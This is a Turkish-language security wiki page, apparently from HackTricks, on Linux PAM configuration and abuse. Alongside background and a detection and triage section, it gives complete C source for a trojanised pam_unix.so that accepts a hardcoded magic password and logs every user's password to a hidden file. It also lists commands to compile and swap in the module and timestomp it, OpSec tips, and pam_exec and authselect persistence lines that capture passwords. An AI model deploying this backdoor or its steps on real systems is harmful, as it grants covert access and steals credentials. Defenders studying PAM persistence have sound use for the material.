# PAM - Takılabilir Kimlik Doğrulama Modülleri

{{#include ../../banners/hacktricks-training.md}}

### Temel Bilgiler

**PAM (Takılabilir Kimlik Doğrulama Modülleri)**, **bilgisayar hizmetlerine erişmeye çalışan kullanıcıların kimliğini doğrulayan** ve erişimlerini çeşitli ölçütlere göre denetleyen bir güvenlik mekanizmasıdır. Dijital bir kapı görevlisi gibi çalışarak yalnızca yetkili kullanıcıların belirli hizmetleri kullanabilmesini sağlar ve sistemin aşırı yüklenmesini önlemek için kullanımlarını sınırlayabilir.

#### Yapılandırma Dosyaları

- **Solaris**, eski merkezi `/etc/pam.conf` dosyasını destekler; ancak güncel yönergeler `/etc/pam.d` altındaki hizmet dosyalarının kullanılmasını önerir.<sup>[[10]](#references)</sup>
- **Linux sistemleri**, hizmete özgü yapılandırmaları `/etc/pam.d` içinde depolayan dizin yaklaşımını tercih eder. Örneğin, login hizmetinin yapılandırma dosyası `/etc/pam.d/login` konumundadır.<sup>[[1]](#references)</sup>

Login hizmeti için bir PAM yapılandırması şöyle görünebilir:

```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```

#### **PAM Yönetim Alanları**

Bu alanlar veya yönetim grupları, kimlik doğrulama ve oturum yönetimi sürecinin farklı yönlerinden sorumlu olan **auth**, **account**, **password** ve **session** gruplarını içerir:<sup>[[1]](#references)</sup>

- **Auth**: Kullanıcı kimliğini doğrular; genellikle parola ister.
- **Account**: Grup üyeliği veya günün saatine bağlı kısıtlamalar gibi koşulları denetleyerek hesabı doğrular.
- **Password**: Karmaşıklık denetimleri veya sözlük saldırılarını önleme dahil parola güncellemelerini yönetir.
- **Session**: Dizinleri bağlama veya kaynak sınırlarını ayarlama gibi hizmet oturumu başlarken ya da biterken yapılan işlemleri yönetir.

#### **PAM Modül Denetimleri**

Denetimler, modülün başarıya veya başarısızlığa vereceği yanıtı belirleyerek genel kimlik doğrulama sürecini etkiler. Bunlar şunlardır:<sup>[[1]](#references)</sup>

- **Required**: Zorunlu bir modülün başarısız olması, sonraki tüm modüller denetlendikten sonra sürecin başarısız olmasına neden olur.
- **Requisite**: Başarısızlık durumunda süreç hemen sonlandırılır.
- **Sufficient**: Daha önceki hiçbir `required` modül başarısız olmadıysa başarı hemen döndürülür ve aynı yönetim grubundaki kalan modüller atlanır.
- **Optional**: Yalnızca yığındaki tek modülse başarısızlığa neden olur.

#### Önemli Saldırı Semantiği

PAM'i analiz ederken veya değiştirirken, eklenen bir kuralın **konumu** hangi yığının bu kuralı göreceğini belirler:<sup>[[1]](#references)[[13]](#references)</sup>

- `include` ve `substack`, kuralları diğer dosyalardan alır. Bu nedenle `sshd` dosyasını düzenlemek yalnızca SSH'yi etkileyebilirken `system-auth`, `common-auth` veya paylaşılan başka bir yığını düzenlemek birden çok hizmeti aynı anda etkileyebilir.<sup>[[1]](#references)[[13]](#references)</sup>
- PAM, `[success=1 default=ignore]` gibi köşeli parantezli denetimleri de destekler. Bunlar, `pam_unix.so` dosyasını görünür biçimde değiştirmek yerine, özel bir denetim başarılı olduktan sonra **bir veya daha fazla modülü atlamak** için kötüye kullanılabilir.<sup>[[1]](#references)</sup>
- `module-path` **mutlak** (`/usr/lib/security/pam_custom.so`) veya varsayılan PAM modül dizinine göre **göreli** olabilir. Modern Linux sistemlerinde gerçek dizinler genellikle `/lib/security`, `/lib64/security`, `/usr/lib/security` veya `/usr/lib/x86_64-linux-gnu/security` gibi multiarch yollarıdır.<sup>[[1]](#references)[[14]](#references)</sup>

Operatörler için kısa not: değişiklik yapmadan önce daima **hizmet grafiğinin tamamını** çıkarın. Örneğin bazı dağıtımlarda `sshd -> password-auth -> system-auth`, bazılarında ise `sshd -> system-remote-login -> system-login -> system-auth` zinciri bulunur; bu durumda tek satırlık implant, amaçlanandan çok daha geniş bir alana yayılabilir.<sup>[[1]](#references)[[13]](#references)</sup>

Özel bir `auth` modülü, hesap parolasından sonra `sudo` için etkileşimli bir sorgulama ekleyebilir. Sorgulamayı elle incelemeden önce, etkin `/etc/pam.d/sudo` yığınını, dahil edilen politikayı, modül argümanlarını ve başvurulan yerel veri dosyalarının izinlerini denetleyin. Okunabilir bir sorgulama sözcük listesi tek başına parola denetimini atlatmaz veya sudoers yetkisi vermez. Ayrıcalıklı geçiş için doğru hesap kimlik doğrulaması, gerekli tüm PAM adımlarının tamamlanması ve root yetkisi verebilen bir sudo kuralı gerekir; gözetimsiz numaralandırma sorgulamayı tetiklememelidir.

Eski Ubuntu [`pam_motd` sahiplik açığı (CVE-2010-0832)](https://ubuntu.com/security/cve-2010-0832) için, kullanılan `libpam-modules` derlemesini ve bir giriş hizmetinin etkilenen session modülünü çağırıp çağırmadığını inceleyin. Ubuntu, açığı 9.10 için **1.1.0-2ubuntu1.1** ve 10.04 LTS için **1.1.1-2ubuntu5** sürümlerinde düzeltti; diğer sürümler veya üretici tarafından geriye taşınan yamalar için ayrı paket değerlendirmesi gerekir. Bildirilen senaryoda, çağıranın kendi home dizinindeki `.cache` öğesini bir symlink ile değiştirip ardından PAM girişi başlatması gerekiyordu; bu da eski modülün korunan hedefin sahipliğini değiştirmesine yol açıyordu. Tek başına bir `.cache` öğesi, `pam_motd.so` satırı veya eski kernel sürümü açığın varlığını kanıtlamaz. Pasif numaralandırma sırasında dosyaları değiştirmeden veya giriş başlatmadan önce home dizini üzerindeki denetimi, etkin modül sürümünü, giriş hizmetine erişilebilirliği, symlink işleme davranışını ve hedef izinlerini kontrol edin. [Ubuntu'nun güvenlik bildirimine](https://ubuntu.com/security/notices/USN-959-1) bakın.

#### Örnek Senaryo

Birden çok auth modülünün bulunduğu bir yapılandırmada süreç katı bir sırayla ilerler. `pam_securetty` modülü giriş terminalinin yetkisiz olduğunu tespit ederse root girişleri engellenir; ancak "required" durumu nedeniyle tüm modüller yine de işlenir. `pam_env`, kullanıcı deneyimini iyileştirmeye yardımcı olabilecek ortam değişkenlerini ayarlar. `pam_ldap` ve `pam_unix` modülleri kullanıcıyı doğrulamak için birlikte çalışır; `pam_unix`, daha önce sağlanan bir parolayı kullanmayı deneyerek kimlik doğrulama yöntemlerinde verimliliği ve esnekliği artırır.<sup>[[1]](#references)[[13]](#references)[[15]](#references)[[16]](#references)[[17]](#references)</sup>


## Bir hizmet yığınında `pam_permit`

`pam_permit.so`, PAM denetimlerinde başarı döndürür. Daha düşük ayrıcalıklı bir kullanıcı, bir hizmetin etkin PAM politikasını değiştirebiliyorsa, bunu kimlik doğrulama yığınını kısa devre yapan bir control flag ile eklemek o hizmetin parola denetimini kaldırabilir. Hangi hizmetlerin etkilendiğine karar vermeden önce `sudo` için `/etc/pam.d/sudo` dosyasını ve dahil edilen `common-auth` veya `system-auth` dosyalarını inceleyin. PAM kimlik doğrulama atlatması yeni bir sudoers kuralı **vermez**; kullanıcının yine de istenen komutu çalıştırma yetkisi olmalıdır. Tek bir `sufficient pam_permit.so` satırının her zaman başarılı olacağını varsaymak yerine kural sırasını ve daha önceki `required` başarısızlıklarını denetleyin.

## PAM'e Arka Kapı Ekleme – `pam_unix.so` Kancasını Kullanma

Önemli Linux ortamlarında kullanılan klasik bir kalıcılık yöntemi, **meşru PAM kitaplığını trojanlaştırılmış bir yedekle değiştirmektir**. PAM yığınının `pam_unix.so` yüklediği bir ana bilgisayarda SSH veya konsol kimlik doğrulaması, bu modülün `pam_sm_authenticate()` giriş noktasını çağırabilir; kötü amaçlı bir yedek, kimlik bilgilerini ele geçirebilir veya *sihirli* bir parola atlatması uygulayabilir.<sup>[[2]](#references)[[11]](#references)</sup>

### Derleme Kısa Notları
Aşağıdaki taslak, kimlik doğrulama belirtecine erişmek için Linux-PAM'in `pam_sm_authenticate()` hizmet giriş noktasını ve `pam_get_authtok()` işlevini kullanır.<sup>[[11]](#references)[[12]](#references)</sup>
<details>
<summary>Örnek `pam_unix.so` trojanı</summary>

```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

static void *real_module;
static int (*orig_auth)(pam_handle_t *, int, int, const char **);
static int (*orig_setcred)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

static int load_original(void) {
    if (real_module) return 0;
    real_module = dlopen("/lib/security/pam_unix.so.bak", RTLD_NOW | RTLD_LOCAL);
    if (!real_module) return -1;
    orig_auth = dlsym(real_module, "pam_sm_authenticate");
    orig_setcred = dlsym(real_module, "pam_sm_setcred");
    return (orig_auth && orig_setcred) ? 0 : -1;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *user = NULL, *pass = NULL;
    pam_get_user(pamh, &user, NULL);
    pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

    /* Magic pwd → immediate success */
    if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

    /* Credential harvesting */
    if (user && pass) {
        int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
        if (fd >= 0) {
            dprintf(fd, "%s:%s\n", user, pass);
            close(fd);
        }
    }

    /* Forward to the renamed original module. */
    if (load_original() != 0) return PAM_SYSTEM_ERR;
    return orig_auth(pamh, flags, argc, argv);
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    if (load_original() != 0) return PAM_SYSTEM_ERR;
    return orig_setcred(pamh, flags, argc, argv);
}
```

</details>

Derleyin ve gizlice değiştirin (replacement/timestomp kalıbı Unit 42 tarafından belgelenmiştir). Wrapper'da sabit kodlanmış yedekleme yolunu ve aşağıdaki komutları hedefin gerçek PAM modül dizinine göre ayarlayın:<sup>[[2]](#references)</sup>
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```

### OpSec İpuçları
1. **Atomik üzerine yazma** – kısmen yazılmış bir kimlik doğrulama modülü bırakmamak için eksiksiz bir library'yi geçici bir dosyaya yazın ve ardından dosyayı hedef konuma yeniden adlandırın.
2. Unit 42'nin AuthDoor analizinde `/usr/bin/.dbus.log` gibi bir yol gözlemlenmiştir; bu nedenle bu yol, hunting için yararlı bir göstergedir.<sup>[[2]](#references)</sup>
3. Diğer yönetim işlemlerinin çalışmaya devam etmesi için PAM stack'in beklediği giriş noktalarını (örneğin, `pam_sm_authenticate` ve `pam_sm_setcred`) koruyun.<sup>[[11]](#references)[[18]](#references)</sup>

### Tespit
Paket bütünlüğü denetimlerinde RPM, kurulu dosyaların metadata bilgilerini doğrular; `debsums -s` checksum hatalarını bildirir ve triage bloğundaki `dpkg -S` paket sahipliğini sorgular. Audit watch söz dizimi, bir yola yapılan yazma ve öznitelik değişikliklerini kaydeder.<sup>[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)</sup>
* `pam_unix.so` dosyasının MD5/SHA256 değerlerini dağıtım paketindeki değerlerle karşılaştırın.
* Elle hash hesaplamadan değiştirilmiş library'leri tespit etmek için `rpm -V pam` veya `debsums -s libpam-modules` komutunu kullanın.
* `/lib/security/` altındaki world-writable dosyaları veya olağandışı sahiplikleri kontrol edin.
* `auditd` kuralı: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* Beklenmeyen modüller için PAM yapılandırmalarında grep yapın: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

Bu `pam_` grep'i, farklı `.so` basename'lerine sahip özel modülleri gözden kaçırır. `/etc/pam.d` içindeki **etkin** `auth`, `account`, `password` ve `session` satırlarını (kullanıldığı yerlerde `/etc/pam.conf` dosyasını da), control flag'leri ve dahil edilen stack'lerle birlikte inceleyin. Normal parola denetiminden önce `auth sufficient` olarak yerleştirilmiş tanıdık olmayan bir modül, paket sahipliğinin ve binary'nin incelenmesini gerektirir; [PAM'in control söz dizimi](https://man7.org/linux/man-pages/man5/pam.d.5.html), başarı durumunda stack'in ilgili bölümünün erkenden sonlanmasına yol açabilir. Tek başına bir modül adı, olağandışı zaman damgası veya `nodelay` seçeneği bypass kanıtı değildir. Davranış bir timing leak'e işaret ediyorsa önce uygulamayı ve servise erişilebilirliği inceleyin; rutin enumeration sırasında tekrar tekrar kimlik doğrulama tahminleri göndermeyin.

### Hızlı triage komutları (sistem ihlalinden sonra veya threat hunting sırasında)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
    dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```

### Kalıcılık için `pam_exec`'i kötüye kullanma
`pam_unix.so`'yu değiştirmek yerine, daha hafif bir dokunuş olarak `/etc/pam.d/sshd` dosyasına bir `pam_exec` satırı eklenebilir. Böylece bu PAM satırına ulaşan bir çağrı, normal yığını bozmadan bir yardımcı programı çalıştırır.<sup>[[4]](#references)</sup>
```bash
# Run during the auth phase; expose_authtok sends the token on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
`pam_exec`, `PAM_USER`, `PAM_RHOST`, `PAM_SERVICE`, `PAM_TTY` ve `PAM_TYPE` gibi ortam değişkenlerinde PAM meta verilerini alır. `expose_authtok` ile yardımcı program, `auth` veya `password` aşamalarında parolanın en fazla `PAM_MAX_RESP_SIZE` baytını `stdin` üzerinden okuyabilir. Yardımcı programın gerçek UID yerine etkin UID ile çalışmasını istiyorsanız `seteuid` ekleyin.<sup>[[4]](#references)</sup>

Aşağıdaki pratik notlarda `pam_exec` için belgelenen modül türleri ve `type=` filtresi esas alınmıştır:<sup>[[4]](#references)</sup>

- `session optional pam_exec.so ...`, soketleri yeniden açmak veya arka planda çalışan bir daemon başlatmak gibi **oturum açma sonrası eylemler** için daha uygundur.
- `auth optional pam_exec.so quiet expose_authtok ...`, oturum açılmadan önce çalıştığı için **kimlik bilgisi yakalama** amacıyla genellikle tercih edilir.
- Yürütmeyi belirli bir PAM aşamasıyla sınırlandırmak ve gereksiz çift çalışmayı önlemek için `type=session` veya `type=auth` kullanılabilir.

Yetki incelemesinde, mevcut kullanıcının yazabildiği mutlak bir `pam_exec.so` yardımcı program yolu, dosya append-only (`a`) olarak işaretlenmiş olsa bile adaydır: [bu öznitelik dosyaya ekleme yapılmasına izin verir](https://man7.org/linux/man-pages/man1/chattr.1.html); bu, bir shell scriptinin daha sonraki davranışını değiştirmek için yeterli olabilir. Önce PAM hizmetinin ve olayın gerçekten bu satıra ulaştığını, yardımcı programın ve üst dizin yolunun güvenilir olduğunu ve komutun daha ayrıcalıklı bir kimlikle çalıştığını doğrulayın; [`seteuid`, hangi PAM UID'sinin kullanılacağını değiştirir](https://man7.org/linux/man-pages/man8/pam_exec.8.html). Tek başına yazılabilir bir dosya veya `lsattr` sonucu, ayrıcalıklı yürütmenin kanıtı değildir.

### Distro araçlarına rağmen kalıcılık: `authselect`

`authselect` kullanan RHEL ve Fedora ailesi sistemlerde, `/etc/pam.d/system-auth` veya `/etc/pam.d/password-auth` gibi oluşturulmuş dosyalarda doğrudan yapılan değişiklikler **`authselect` tarafından üzerine yazılabilir**. Kalıcılık için operatörler genellikle `/etc/authselect/custom/<profile>/` altındaki etkin özel profili yamalar ve ardından yeniden seçer.<sup>[[5]](#references)[[19]](#references)</sup>

Root erişiminiz varsa tipik iş akışı:<sup>[[5]](#references)</sup>

```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Regenerate the PAM files after modifying the active custom profile
authselect apply-changes
```

Bu, hem saldırı hem de triyaj açısından önemlidir: `/etc/pam.d/system-auth` dosyasında `Generated by authselect` ve `Do not modify this file manually` banner'ları varsa, gerçek kalıcılık noktası `/etc/pam.d/` yerine `/etc/authselect/custom/` altında olabilir.<sup>[[5]](#references)</sup>

### Sahada görülen güncel tradecraft

Plague Linux backdoor'u hakkında 2025'te yayımlanan güncel raporlarda, aynı temel fikrin bir adım ileri taşındığı görüldü: **statik bir bypass parolası** içeren kötü amaçlı bir PAM bileşeni ve oturum izlerini azaltmak için oturum açtıktan sonra SSH ile ilgili ortam değişkenlerinin ve shell geçmişinin (`HISTFILE=/dev/null`) temizlenmesi.<sup>[[3]](#references)</sup> Bu, hunting için yararlı bir örüntüdür; çünkü backdoor mantığı PAM'de bulunurken gizlilik izleri yalnızca kimlik doğrulama başarılı **olduktan sonra** ortaya çıkabilir.


## References

- [1] [pam.conf(5) / pam.d(5) - Linux-PAM Kılavuzu](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [2] [Gizli Operatörün Oyun Kitabı: Küresel Telekomünikasyon Ağlarına Sızma - Unit 42](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)
- [3] [Nextron Systems - Plague: Linux için Yeni Keşfedilen PAM Tabanlı Backdoor](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)
- [4] [pam_exec(8) - Linux-PAM Kılavuzu](https://man7.org/linux/man-pages/man8/pam_exec.8.html)
- [5] [authselect kullanarak kullanıcı kimlik doğrulamasını yapılandırma - Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/10/html/configuring_authentication_and_authorization_in_rhel/configuring-user-authentication-using-authselect)
- [6] [rpm(8) - RPM](https://rpm.org/docs/4.20.x/man/rpm.8)
- [7] [debsums(1) - Debian Manpages](https://manpages.debian.org/unstable/debsums/debsums.1.en.html)
- [8] [auditctl(8) - Linux kılavuz sayfası](https://man7.org/linux/man-pages/man8/auditctl.8.html)
- [9] [dpkg-query(1) - Debian Manpages](https://manpages.debian.org/testing/dpkg/dpkg-query.1.en.html)
- [10] [Oracle Solaris 11.4'te Kimlik Doğrulamayı Yönetme](https://docs.oracle.com/cd/E37838_01/pdf/E67470.pdf)
- [11] [pam_sm_authenticate(3) - Linux-PAM Kılavuzu](https://man7.org/linux/man-pages/man3/pam_sm_authenticate.3.html)
- [12] [pam_get_authtok(3) - Linux-PAM Kılavuzu](https://man7.org/linux/man-pages/man3/pam_get_authtok.3.html)
- [13] [Sistem Düzeyinde Kimlik Doğrulama Kılavuzu - Red Hat Enterprise Linux 7](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html-single/system-level_authentication_guide/index)
- [14] [Ubuntu paket dosya listesi: libpam-modules/noble/amd64](https://packages.ubuntu.com/noble/amd64/libpam-modules/filelist)
- [15] [pam_env(8) - Linux-PAM Kılavuzu](https://man7.org/linux/man-pages/man8/pam_env.8.html)
- [16] [pam_unix(8) - Linux-PAM Kılavuzu](https://man7.org/linux/man-pages/man8/pam_unix.8.html)
- [17] [pam_ldap(5) - Debian Manpages](https://manpages.debian.org/testing/libpam-ldap/pam_ldap.5.en.html)
- [18] [pam_sm_setcred(3) - Linux-PAM Kılavuzu](https://man7.org/linux/man-pages/man3/pam_sm_setcred.3.html)
- [19] [Değişiklikler/Authselect'i Zorunlu Hale Getirme - Fedora Projesi Wiki](https://fedoraproject.org/wiki/Changes/Make_Authselect_Mandatory)
{{#include ../../banners/hacktricks-training.md}}
